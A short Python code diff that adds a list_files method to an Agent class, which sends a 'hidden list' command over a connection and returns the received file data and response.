@@ -72,6 +72,20 @@ class Agent:
         ic(len(file_data))
         res = self.conn.recv_responce_struct()
         return res, file_data
+    
+    def list_files(self):
+        self.conn.send_command(
+            Command(
+                0,
+                FunCode.HIDDEN_OPRATION | FunCode.HIDDEN_LIST,
+                0,
+                '',
+            )
+        )
+        file_data = ic(self.conn.recv_file())
+        ic(len(file_data))
+        res = self.conn.recv_responce_struct()
+        return res, file_data
 
     def hidden_action_without_upload(
         self, fncode: FunCode, targetPath: str
